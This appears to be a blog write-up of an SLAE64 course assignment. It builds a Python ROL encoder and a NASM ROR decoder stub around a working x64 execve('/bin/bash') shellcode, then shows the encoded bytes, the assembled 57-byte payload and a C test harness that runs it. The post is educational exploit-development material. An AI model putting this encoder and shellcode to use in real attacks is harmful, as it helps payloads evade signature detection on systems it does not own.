---
title: SLAE64 Assignment 4 - ROL Encoder 
date: 2020-4-26
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE64.png
tags:
  - Assembly
  - Code
  - SLAE
  - Linux
  - x64
  - Shellcode
--- 
![](/assets/images/SLAE64.png)

# Overview
For the fourth assignment of the SLAE64 I created a Rotate Left (ROL) Encoder and a Rotate Right (ROR) decoder.   
The ROL encoder is a python program that rotates every byte of the payload to the left by 1 bit. The companion ROR decoder rotates every byte of the payload to the right by 1 bit, and then passes execution to the decoded payload. The example payload is an execve shellcode that spawns a bash shell.

# The Python Rotate Left (ROL) Encoder 

```python
#!/usr/bin/python
shellcode  = "\x48\x31\xf6"     # xor rsi, rsi
shellcode += "\x48\xf7\xe6"     # mul rsi          ; rdx&rax= 0x0
shellcode += "\x48\x31\xff"     # xor rdi, rdi
shellcode += "\x57"             # push rdi
shellcode += "\x48\x83\xc2\x68" # add rdx, 0x68
shellcode += "\x52"             # push rdx
shellcode += "\x48\xba\x2f\x62\x69\x6e\x2f\x62\x61\x73" # movabs rdx, 0x7361622f6e69622f
shellcode += "\x52"             # push rdx
shellcode += "\x48\x31\xd2"     # xor rdx, rdx
shellcode += "\x48\x89\xe7"     # mov rdi, rsp ; rdi = Pointer -> "/bin/bash"0x00
shellcode += "\xb0\x3b"         # mov al, 0x3b ; execve syscall number
shellcode += "\x0f\x05";        # syscall  ; call execve("/bin/bash", NULL, NULL)

encoded = ""
for x in bytearray(shellcode) :
    if x > 127:
        x = x - 128             # Remove the left-most bit
        x = x << 1              # Shift to the left 1
        x += 1                  # Add 1, to complete the rotate
        encoded += '0x'
        encoded += '%02x,' %x  # Add the rotated left hex to string
    else:
        encoded += '0x'        # No leftmost bit, just rotate
        encoded += '%02x,' %(x << 1)
print encoded+"0xaa"
print 'Len: %d' % len(bytearray(shellcode))
```  

+ The byte 0xaa is added to the end of the payload. This is how our ROR decoder will know it has reached the end of the payload.

## Encoding the Payload
```bash
root# python rotateLeftEncoder.py
0x90,0x62,0xed,0x90,0xef,0xcd,0x90,0x62,0xff,0xae,0x90,0x07,\
0x85,0xd0,0xa4,0x90,0x75,0x5e,0xc4,0xd2,0xdc,0x5e,0xc4,0xc2,\
0xe6,0xa4,0x90,0x62,0xa5,0x90,0x13,0xcf,0x61,0x76,0x1e,0x0a,0xaa
Len: 36
```

# The Rotate Right (ROR) Decoder

```c
; Filename: rotateRightDecoder.nasm
; Author:   boku
global _start
section .text
_start:
  jmp short call_decoder ; 1. jump to shellcode string
decoder:
  pop rsi                ; 3. RSI=&String 
decode:
  ror byte [rsi], 1      ; 4. decode byte with bitwise rotate right
  cmp byte [rsi], 0x55   ; 5. Last byte? ror 0xaa, 1 = 0x55
  je Shellcode           ;    - Yes? jump to payload and execute
  inc rsi                ; 6. No? Move forward 1 byte
  jmp short decode       ; 7. Lets decode the next byte
call_decoder:
  call decoder           ; 2. [RSP]=&String
  Shellcode: db 0x90,0x62,0xed,0x90,0xef,0xcd,0x90,0x62,0xff,0xae,\
                0x90,0x07,0x85,0xd0,0xa4,0x90,0x75,0x5e,0xc4,0xd2,\
                0xdc,0x5e,0xc4,0xc2,0xe6,0xa4,0x90,0x62,0xa5,0x90,\
                0x13,0xcf,0x61,0x76,0x1e,0x0a,0xaa
```

## Getting the ROR Decoder Shellcode

```bash
root# cat getshellcode.sh
#!/bin/bash
asmFile=$1
noExt=$(echo $asmFile | sed 's/\..*$//g')
objFile=$noExt".o"
nasm -f elf64 $asmFile -o $objFile
for i in $(objdump -D $objFile | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo ''

root# ./getshellcode.sh rotateRightDecoder.asm
\xeb\x0d\x5e\xd0\x0e\x80\x3e\x55\x74\x0a\x48\xff
\xc6\xeb\xf4\xe8\xee\xff\xff\xff\x90\x62\xed\x90
\xef\xcd\x90\x62\xff\xae\x90\x07\x85\xd0\xa4\x90
\x75\x5e\xc4\xd2\xdc\x5e\xc4\xc2\xe6\xa4\x90\x62
\xa5\x90\x13\xcf\x61\x76\x1e\x0a\xaa
```

# Testing the ROR Decoder

```c
// Shellcode Title:  Linux/x64 - ROL Encoded Execve Shellcode (57 bytes)
// Shellcode Author: Bobby Cooke
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\xeb\x0d"              // jmp short call_decoder
// decoder:
"\x5e"                  // pop rsi = &String
// decode:
"\xd0\x0e"              // ror byte [rsi], 1
"\x80\x3e\x55"          // cmp byte [rsi], 0x55 - last byte? ror 0xaa, 1 = 0x55
"\x74\x0a"              // je Shellcode - End? Jump to shellcode!
"\x48\xff\xc6"          // inc rsi - Not end? move 2 next byte
"\xeb\xf4"              // jmp short decode - loop 2 decode next byte
// call_decoder:
"\xe8\xee\xff\xff\xff"  // call decoder // go 2 decode loop
// Execve(/bin/bash) ROL Encoded Shellcode
"\x90\x62\xed\x90\xef\xcd\x90\x62\xff\xae\x90\x07\x85"
"\xd0\xa4\x90\x75\x5e\xc4\xd2\xdc\x5e\xc4\xc2\xe6\xa4"
"\x90\x62\xa5\x90\x13\xcf\x61\x76\x1e\x0a\xaa";

int main()
{
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}

```

## Final Test

```bash
root# gcc -m64 -z execstack -fno-stack-protector shellcode.c -o shellcode
root# echo $$ | xargs ps
  PID TTY      STAT   TIME COMMAND
 3067 pts/3    Ss     0:00 /bin/bash
root# ./shellcode
Shellcode Length:  57
root# echo $$ | xargs ps
  PID TTY      STAT   TIME COMMAND
 3501 pts/3    S      0:00 [bash]
```
